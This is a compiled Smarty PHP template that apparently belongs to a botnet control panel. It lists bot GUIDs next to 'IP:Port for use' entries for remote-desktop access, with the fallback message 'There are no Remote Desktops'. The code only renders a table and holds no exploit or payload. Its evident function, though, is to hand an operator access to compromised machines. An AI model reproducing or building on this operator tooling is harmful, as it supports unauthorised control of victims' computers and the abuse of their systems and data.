<?php /* Smarty version Smarty-3.0.6, created on 2011-02-19 21:06:19
         compiled from "/var/www/maincp/client/templates/rdp.tpl" */ ?>
<?php /*%%SmartyHeaderCode:3028909904d6030cb690bc9-27470426%%*/if(!defined('SMARTY_DIR')) exit('no direct access allowed');
$_smarty_tpl->decodeProperties(array (
  'file_dependency' => 
  array (
    'd9e0a1e40f1d0f663a578df2d5470bc8ac1dd19a' => 
    array (
      0 => '/var/www/maincp/client/templates/rdp.tpl',
      1 => 1296947090,
      2 => 'file',
    ),
  ),
  'nocache_hash' => '3028909904d6030cb690bc9-27470426',
  'function' => 
  array (
  ),
  'has_nocache_code' => false,
)); /*/%%SmartyHeaderCode%%*/?>
<h2><b>Server</b>: <?php echo $_smarty_tpl->getVariable('HOST')->value;?>
</h2>
<hr size='1' color='#CCC'>

<table width="720px" cellspacing="0" cellpadding="0" border="1" style="border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;">

<th width='20px' style='background: rgb(80,80,80); color: rgb(232,232,232);'>#</th>
<th width='480px' style='background: rgb(80,80,80); color: rgb(232,232,232);'>Bot GUID</th>
<th width='220px' style='background: rgb(80,80,80); color: rgb(232,232,232);'>IP:Port for use</th>

<?php  $_smarty_tpl->tpl_vars['REC'] = new Smarty_Variable;
 $_from = $_smarty_tpl->getVariable('CONT_ARR')->value; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array');}
if ($_smarty_tpl->_count($_from) > 0){
    foreach ($_from as $_smarty_tpl->tpl_vars['REC']->key => $_smarty_tpl->tpl_vars['REC']->value){
?>
<tr><td align='center'><?php echo $_smarty_tpl->tpl_vars['REC']->value['I'];?>
</td><td align='center'><?php echo $_smarty_tpl->tpl_vars['REC']->value['GUID'];?>
</td><td align='center'><input readonly value='<?php echo $_smarty_tpl->tpl_vars['REC']->value['HOST'];?>
:<?php echo $_smarty_tpl->tpl_vars['REC']->value['PORT'];?>
' style='width: 140px; background: rgb(0,0,0); color: rgb(0,255,0);'></td></tr>
<?php }} else { ?>
<tr><td colspan='3' class='error' style='text-align:center;'>There are no Remote Desktops</td></tr>
<?php } ?>

</table>